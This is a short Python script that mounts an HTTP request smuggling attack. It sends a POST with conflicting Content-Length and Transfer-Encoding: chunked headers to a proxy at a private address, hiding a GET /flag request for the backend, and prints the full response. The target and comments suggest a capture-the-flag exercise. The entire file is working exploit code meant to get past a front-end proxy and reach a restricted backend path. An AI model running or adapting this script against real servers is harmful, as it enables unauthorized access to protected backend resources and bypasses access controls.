import socket

# Target service address and port
HOST = '10.80.16.0'
PORT = 8000

# The request we want to smuggle to the backend
smuggled_request = (
    b'GET /flag HTTP/1.1\r\n'
    b'Host: backend-server\r\n'
    # 'Connection: close' tells the server to close the connection after this response,
    # which helps us know when to stop reading.
    b'Connection: close\r\n\r\n'
)

# Calculate the size of the smuggled request in hexadecimal for the chunk header
chunk_size = hex(len(smuggled_request))[2:].encode('ascii')

# Construct the body of the main request in "chunked" format.
# The proxy will incorrectly forward this entire block, including metadata.
chunked_body = (
    chunk_size + b'\r\n' +      # Chunk size, e.g., b'3f\r\n'
    smuggled_request +          # The smuggled request itself
    b'\r\n' +                   # End of chunk
    b'0\r\n\r\n'                # End of chunked stream
)

# The main POST request.
# Content-Length will cause the backend to stop reading early and process the rest as a new request.
outer_request = (
    b'POST /anypath HTTP/1.1\r\n'
    b'Host: ' + HOST.encode('ascii') + b'\r\n'
    # The length must equal the length of the chunk size string (e.g., '3f\r\n' -> 4 bytes)
    b'Content-Length: ' + str(len(chunk_size) + 2).encode('ascii') + b'\r\n'
    b'Transfer-Encoding: chunked\r\n'
    b'Connection: close\r\n\r\n'
)

# Combine the main request and its body
payload = outer_request + chunked_body

print("--- Sending Payload ---")
print(payload.decode(errors='ignore'))
print("-----------------------\n")

# Send the payload and read the FULL response
try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(payload)
        
        # --- KEY CHANGE ---
        # Read from the socket in a loop until it's closed by the server.
        full_response = b""
        while True:
            data = s.recv(4096)
            if not data:
                break
            full_response += data
        
        print("--- Received Response ---")
        print(full_response.decode(errors='ignore'))
        print("-------------------------")

except Exception as e:
    print(f"An error occurred: {e}")